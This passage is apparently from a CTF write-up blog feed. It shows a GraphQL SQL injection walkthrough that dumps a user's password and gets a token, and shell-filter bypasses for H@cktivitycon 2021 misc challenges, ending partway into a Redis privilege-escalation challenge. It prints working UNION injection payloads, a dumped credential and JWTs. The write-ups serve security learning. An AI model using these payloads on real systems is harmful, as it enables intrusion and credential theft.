class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;type&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Field&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}]}}}</span>
</code></pre></div><p>Using GraphQL voyager, the schema can be visualized as follows:</p>
<p>&gt; <strong>Query</strong>:</p>
<p><div class="img-container"><img src="imgs/image-20210917195515613.png" alt="image-20210917195515613"  /></div>
</p>
<p>&gt; <strong>Mutation</strong></p>
<p><div class="img-container"><img src="imgs/image-20211009120159163.png" alt="image-20211009120159163"  /></div>
</p>
<p>From what I understand, Query and Mutation are just like Getter and Setter functions in Java or other Programming languages.</p>
<p>I tried to query the flag with <code>{&quot;query&quot;:&quot;{flag}&quot;}</code>, but it turned out a valid token for authentication is required.</p>
<p>The next thing I tried was to see if I could dump out the author&rsquo;s password with the following query, and I couldn&rsquo;t.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">##</span> <span class="err">req</span>
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;{ posts {id  name author{username password}} }&#34;</span><span class="p">}</span> 

<span class="err">##</span> <span class="err">resp</span>
<span class="p">{</span>
   <span class="nt">&#34;data&#34;</span><span class="p">:{</span>
      <span class="nt">&#34;posts&#34;</span><span class="p">:[</span>
         <span class="p">{</span>
            <span class="nt">&#34;author&#34;</span><span class="p">:{</span>
               <span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
               <span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;congon4tor&#34;</span>
            <span class="p">},</span>
            <span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
            <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Strawberry Cake&#34;</span>
         <span class="p">},</span>
         <span class="p">{</span>
            <span class="nt">&#34;author&#34;</span><span class="p">:{</span>
               <span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
               <span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;congon4tor&#34;</span>
            <span class="p">},</span>
            <span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span>
            <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Grandma&#39;s Yeast Rolls&#34;</span>
         <span class="p">},</span>
         <span class="p">{</span>
            <span class="nt">&#34;author&#34;</span><span class="p">:{</span>
               <span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
               <span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;congon4tor&#34;</span>
            <span class="p">},</span>
            <span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">3</span><span class="p">,</span>
            <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Blackberry-Orange Cake&#34;</span>
         <span class="p">},</span>
         <span class="p">{</span>
            <span class="nt">&#34;author&#34;</span><span class="p">:{</span>
               <span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
               <span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;congon4tor&#34;</span>
            <span class="p">},</span>
            <span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">4</span><span class="p">,</span>
            <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Apple Pie&#34;</span>
         <span class="p">}</span>
      <span class="p">]</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>Then I tried to overwrite/update the user password with mutation functions (+ space in username, capital, etc), and it also didn&rsquo;t work.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">##</span> <span class="err">Query</span> <span class="err">to</span> <span class="err">update</span> <span class="err">pass</span> 
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;mutation {createUser (username: \&#34;Congon4tor\&#34;, password: \&#34;choropys\&#34;) {username password}}&#34;</span> <span class="p">}</span>  
<span class="err">##</span> <span class="err">Query</span> <span class="err">to</span> <span class="err">auth</span> <span class="err">and</span> <span class="err">grab</span> <span class="err">the</span> <span class="err">token</span>
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;mutation {authenticateUser(username: \&#34;Congon4tor\&#34;, password: \&#34;choropys\&#34;) {token}}&#34;</span>
</code></pre></div><h4 id="sql-injection-in-graphql">SQL injection in GraphQL</h4>
<p>Since I was stuck, I started to re-enumerate the web to find something I missed, and then I found a weird behavior in a post titled with <code>Grandma's Yeast Rolls</code>. Only the page for that post is a blank page.</p>
<p>When I looked at the server response in the dev tool, it was revealed that a single quote <code>'</code> in the post title broke the request.</p>
<p><div class="img-container"><img src="imgs/image-20210921025404405.png" alt="image-20210921025404405"  /></div>
</p>
<p>To validate that the site is vulnerable to SQLi,  I tried to send a single post request with the following query:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;Strawberry Cake\&#34;){ name }}&#34;</span><span class="p">}</span>  
</code></pre></div><p>The server responded with the expected result:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Strawberry Cake&#34;</span><span class="p">}]}}</span>
</code></pre></div><p>When I changed the request to:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;Grandma&#39; OR 1=1 --\&#34;){ name }}&#34;</span><span class="p">}</span>
</code></pre></div><p>It returned all the posts !</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json; charset=utf-8</span>
<span class="n">Date</span><span class="o">:</span> <span class="l">Fri, 17 Sep 2021 19:59:19 GMT</span>
<span class="n">Content-Length</span><span class="o">:</span> <span class="l">134</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>

<span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Strawberry Cake&#34;</span><span class="p">},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Grandma&#39;s Yeast Rolls&#34;</span><span class="p">},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Blackberry-Orange Cake&#34;</span><span class="p">},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Apple Pie&#34;</span><span class="p">}]}}</span>
</code></pre></div><p>With this, I obtained the following information:</p>
<ul>
<li>
<p>There are 6 columns.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;&#39; ORDER BY 1,2,3,4,5,6 -- \&#34;){ name }}&#34;</span><span class="p">}</span>  
</code></pre></div></li>
<li>
<p>Injection point is on column 2</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">##</span> <span class="err">req</span>
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;&#39; UNION SELECT 1,2,3,4,5,6 -- \&#34;){ name }}&#34;</span><span class="p">}</span> 

<span class="err">##</span> <span class="err">resp</span>
<span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;2&#34;</span><span class="p">}]}}</span>
</code></pre></div></li>
<li>
<p>The DB is SQLite</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">##</span> <span class="err">req</span>
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;&#39; UNION SELECT 1,sqlite_version(),3,4,5,6 -- \&#34;){ name }}&#34;</span><span class="p">}</span>  

<span class="err">##</span> <span class="err">resp</span>
<span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;3.36.0&#34;</span><span class="p">}]}}</span>
</code></pre></div></li>
<li>
<p>There are two tables: <code>posts</code> and <code>users</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">##</span> <span class="err">req</span>
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;&#39; UNION SELECT 1,tbl_name ,3,4,5,6  FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; -- \&#34;){ name }}&#34;</span><span class="p">}</span>  

<span class="err">##</span> <span class="err">resp</span>
<span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;posts&#34;</span><span class="p">},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;users&#34;</span><span class="p">}]}}</span>
</code></pre></div></li>
</ul>
<p>Based on the voyager views, I assumed that the table has the username and the password columns, so I sent a query to dump these columns, and it was correct.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">##</span> <span class="err">req</span>
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;&#39; UNION SELECT 1,(SELECT username||password FROM users),3,4,5,6 -- \&#34;){ name }}&#34;</span><span class="p">}</span>

<span class="err">##</span> <span class="err">resp</span>
<span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;posts&#34;</span><span class="p">},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;congon4torn8bboB!3%vDwiASVgKhv&#34;</span><span class="p">}]}}</span>
</code></pre></div><p>With these credentials, I can request for a valid token</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">##</span> <span class="err">req</span>
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;mutation {authenticateUser(username: \&#34;congon4tor\&#34;, password: \&#34;n8bboB!3%vDwiASVgKhv\&#34;) {token}}&#34;</span><span class="p">}</span> 

<span class="err">##</span> <span class="err">resp</span>
<span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;authenticateUser&#34;</span><span class="p">:{</span><span class="nt">&#34;token&#34;</span><span class="p">:</span><span class="s2">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNvbmdvbjR0b3IiLCJleHAiOjE2MzIzNDIzNjUsImlhdCI6MTYzMjE2OTU2NSwiaXNzIjoiQ29uZ29uNHRvciJ9.2huNUpNe3_vIkAwIcYxKeLbJfnmyugX3GydGD9prJiY&#34;</span><span class="p">}}}</span>
</code></pre></div><p>Now I could query the flag with</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/graphql</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">challenge.ctf.games:30013</span>
<span class="err">...[SNIP]...</span>
<span class="g">content-type: application/json
</span><span class="g">Origin: http://challenge.ctf.games:32347
</span><span class="g">Content-Length: 23
</span><span class="g">Connection: close
</span><span class="g">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNob3JvcHlzIiwiZXhwIjoxNjMyMDYzNDEyLCJpYXQiOjE2MzE4OTA2MTIsImlzcyI6IkNvbmdvbjR0b3IifQ.mXLkQDZ5Oum3Bq8A4ZFHyNX9QmS0qhcBR8ph0-WfxmI
</span><span class="g">Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNvbmdvbjR0b3IiLCJleHAiOjE2MzIzNDIzNjUsImlhdCI6MTYzMjE2OTU2NSwiaXNzIjoiQ29uZ29uNHRvciJ9.2huNUpNe3_vIkAwIcYxKeLbJfnmyugX3GydGD9prJiY
</span><span class="g">
</span><span class="g">{
</span><span class="g">&#34;query&#34;:&#34;{flag}&#34;
</span><span class="g">}
</span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json; charset=utf-8</span>
<span class="n">Date</span><span class="o">:</span> <span class="l">Fri, 17 Sep 2021 20:17:24 GMT</span>
<span class="n">Content-Length</span><span class="o">:</span> <span class="l">53</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>

<span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;flag&#34;</span><span class="p">:</span><span class="s2">&#34;flag{9d26b6e4a765ecd87fe03a1494c22236}&#34;</span><span class="p">}}</span>
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>H@cktivitycon 2021 - Misc</title>
      <link>https://fahmifj.github.io/ctf/hacktivitycon-2021-misc/</link>
      <pubDate>Mon, 04 Oct 2021 02:50:12 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/ctf/hacktivitycon-2021-misc/</guid>
      <description>This is my late CTF writeups for H@cktivitycon 2021 miscellaneous category.</description>
      <content:encoded><![CDATA[<p>So, in mid September 2021, I participated in the H@cktivitycon 2021 CTF. The event was hosted by HackerOne and lasted for two days.</p>
<p>A bit late but in this post, I&rsquo;ll share my writeups/solutions for three Miscellaneous category challenges that I solved.</p>
<p>I signed up earlier but only played the main challenges in the last few hours, which I now regret because there were so many fantastic challenges 😅🔨</p>
<h2 id="easy">Easy</h2>
<h3 id="badwords">Badwords</h3>
<h4 id="description">Description</h4>
<blockquote>
<p>You look questionable&hellip; if you don&rsquo;t have anything good to say, don&rsquo;t say anything at all!</p>
</blockquote>
<h4 id="walkthrough">Walkthrough</h4>
<p>When connecting, I can assume that it&rsquo;s not in a proper TTY, maybe a kind of wrapper shell. Each command I sent returns with the same message telling that it was a bad word.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">iamf@ubuntu:~$ rlwrap nc -v challenge.ctf.games <span class="m">32559</span>
Connection to challenge.ctf.games <span class="m">32559</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>-1<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
user@host:/home/user$ ls -l
ls -l
You said a bad word, <span class="s2">&#34;l&#34;</span>!!
user@host:/home/user$ <span class="nb">echo</span> <span class="nv">$0</span>
<span class="nb">echo</span> <span class="nv">$0</span>
You said a bad word, <span class="s2">&#34;echo&#34;</span>!!
</code></pre></div><p>But if I send a command separator, it returns a syntax error (notice the <code>;'</code>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="p">;</span>ls
<span class="p">;</span>ls
bash: syntax error near unexpected token <span class="sb">`</span><span class="p">;</span><span class="err">&#39;</span>
user@host:/home/user$
</code></pre></div><p>Now if I send a command enclosed with a single quote, I get the expected results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;whoami&#39;</span>
<span class="s1">&#39;whoami&#39;</span>
user
</code></pre></div><p>And adding an arg returns a different error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;ls -l&#39;</span>
<span class="s1">&#39;ls -l&#39;</span>
bash: ls -l: <span class="nb">command</span> not found
</code></pre></div><p>But if I separate the args, it returns with</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span>
<span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span>
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 just
</code></pre></div><p>Now I can just do a recursive <code>ls</code> to find the flag and read it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span> <span class="s1">&#39;-R&#39;</span> <span class="s1">&#39;just&#39;</span>
<span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span> <span class="s1">&#39;-R&#39;</span> <span class="s1">&#39;just&#39;</span>
just:
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 out

just/out:
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 of

just/out/of:
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 reach

just/out/of/reach:
total <span class="m">4</span>
-rw-r--r-- <span class="m">1</span> user user <span class="m">38</span> Sep  <span class="m">9</span> 19:47 flag.txt
user@host:/home/user$ <span class="s1">&#39;cat&#39;</span> <span class="s1">&#39;just/out/of/reach/flag.txt&#39;</span>
<span class="s1">&#39;cat&#39;</span> <span class="s1">&#39;just/out/of/reach/flag.txt&#39;</span>
flag<span class="o">{</span>2d43e30a358d3f30fe65cc47a9cbbe98<span class="o">}</span>user@host:/home/user$
</code></pre></div><h2 id="medium">Medium</h2>
<h3 id="shelle">Shelle</h3>
<h4 id="description-1">Description</h4>
<blockquote>
<p>Professor Shelle created a custom psuedo shell for us to learn Linux,  she believes it&rsquo;s safe and no one can ever read the flag. Can you prove  her wrong?*</p>
</blockquote>
<h4 id="walkthrough-1">Walkthrough</h4>
<p>This challenge is another shell wrapper like badwords. Upon connected, I was provided with the following menu.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">iamf@ubuntu:~$ rlwrap nc challenge.ctf.games <span class="m">32217</span>

Welcome to Shelle, a custom psuedo shell utility created by Professor Shelle in order to teach students about Linux terminals
Shelle is a restricted environment to prevent any misuse, Please Enter <span class="s1">&#39;HELP&#39;</span> to know about available features, happy learning !

root@pshelle$ HELP
HELP

Here is the list of <span class="nb">command</span> availiable to Students
1&gt; whoami
2&gt; <span class="nb">pwd</span>
3&gt; ls
4&gt; ps
5&gt; id
6&gt; <span class="nb">echo</span>
7&gt; cat


root@shelle$
</code></pre></div><p>When I use the <code>ls</code> command, I didn&rsquo;t find any flag in the current working directory. It seems I have to find it somewhere in this machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@shelle$ ls
ls
assignment.txt  bin
</code></pre></div><p>So the first thing I tried was to list the root directory with <code>ls -l /</code>, but it turned out some characters, including <code>/</code>, are flagged as illegal. Luckily, <code>$</code>, <code>(</code>, <code>)</code>, <code>&quot;</code>, and <code>\</code> are not, so I can use the <code>echo</code> command with <code>-e</code> option within a subshell to print <code>\x2f</code> which is a <code>/</code> in Hex form.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@shelle$ ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2f&#34;</span><span class="k">)</span>
ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2f&#34;</span><span class="k">)</span>
bin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  var
boot  etc  lib   lib64  media   opt  root  sbin  sys  usr
</code></pre></div><p>After wandering around, I found the flag on <code>/opt/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@shelle$ ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt&#34;</span><span class="k">)</span> -lt
ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt&#34;</span><span class="k">)</span> -lt
total <span class="m">24</span>
-rwxr-xr-x <span class="m">1</span> shelle shelle <span class="m">17312</span> Sep  <span class="m">9</span> 19:33 binary
-r--r--r-- <span class="m">1</span> root   root      <span class="m">38</span> Sep  <span class="m">9</span> 19:33 flag.txt

root@shelle$ cat <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt\x2fflag.txt&#34;</span><span class="k">)</span>
cat <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt\x2fflag.txt&#34;</span><span class="k">)</span>
flag<span class="o">{</span>82ad133488ad326eaf2120e03253e5d7<span class="o">}</span>
</code></pre></div><blockquote>
<p><strong>Note</strong>: I added a space after the shell prompt for readability and syntax highlighting.</p>
</blockquote>
<h3 id="redlike">Redlike</h3>
<h4 id="description-2">Description</h4>
<blockquote>
<p>You know, I like the color red. Primary colors are the best colors &ndash; you can do so much with them!</p>
<p>Escalate your privileges and retrieve the flag out of <code>root</code>&rsquo;s home directory.</p>
</blockquote>
<h4 id="walkthrough-2">Walkthrough</h4>
<p>For this challenge, there was a set of credentials given for SSH login into a VM instance.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">iamf@ubuntu:~$ ssh -p <span class="m">31464</span> user@challenge.ctf.games
user@challenge.ctf.games<span class="s1">&#39;s password:
</span><span class="s1">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64)
</span><span class="s1">
</span><span class="s1"> * Documentation:  https://help.ubuntu.com
</span><span class="s1"> * Management:     https://landscape.canonical.com
</span><span class="s1"> * Support:        https://ubuntu.com/advantage
</span><span class="s1">
</span><span class="s1">This system has been minimized by removing packages and content that are
</span><span class="s1">not required on a system that users do not log into.
</span><span class="s1">
</span><span class="s1">To restore this content, you can run the &#39;</span>unminimize<span class="err">&#39;</span> command.

The programs included with the Ubuntu system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

user@redlike-a6548218fe17631b-b75878d5-qsl75:~$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
</code></pre></div><p>At the root directory, I found <code>.docker-entrypoint</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ ls -lah
total 72K
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 .
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 ..
-rwxr-xr-x    <span class="m">1</span> root root   <span class="m">61</span> Sep <span class="m">16</span> 14:43 .docker-entrypoint
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">7</span> Aug <span class="m">27</span> 07:16 bin -&gt; usr/bin
drwxr-xr-x    <span class="m">2</span> root root 4.0K Apr <span class="m">15</span>  <span class="m">2020</span> boot
drwxr-xr-x    <span class="m">5</span> root root  <span class="m">360</span> Sep <span class="m">18</span> 11:34 dev
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 etc
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:43 home
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">7</span> Aug <span class="m">27</span> 07:16 lib -&gt; usr/lib
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">9</span> Aug <span class="m">27</span> 07:16 lib32 -&gt; usr/lib32
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">9</span> Aug <span class="m">27</span> 07:16 lib64 -&gt; usr/lib64
lrwxrwxrwx    <span class="m">1</span> root root   <span class="m">10</span> Aug <span class="m">27</span> 07:16 libx32 -&gt; usr/libx32
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 media
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 mnt
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 opt
dr-xr-xr-x <span class="m">2595</span> root root    <span class="m">0</span> Sep <span class="m">18</span> 11:34 proc
drwx------    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 root
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 run
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">8</span> Aug <span class="m">27</span> 07:16 sbin -&gt; usr/sbin
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 srv
dr-xr-xr-x   <span class="m">12</span> root root    <span class="m">0</span> Sep <span class="m">18</span> 11:33 sys
drwxrwxrwt    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 tmp
drwxr-xr-x    <span class="m">1</span> root root 4.0K Aug <span class="m">27</span> 07:16 usr
drwxr-xr-x    <span class="m">1</span> root root 4.0K Aug <span class="m">27</span> 07:27 var
</code></pre></div><p>Based on the contents of the file and the name of the challenge, it&rsquo;s clear that the privesc has something to do with Redis.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ cat .docker-entrypoint
<span class="c1">#!/bin/bash</span>

/etc/init.d/redis-server start
/usr/sbin/sshd -D
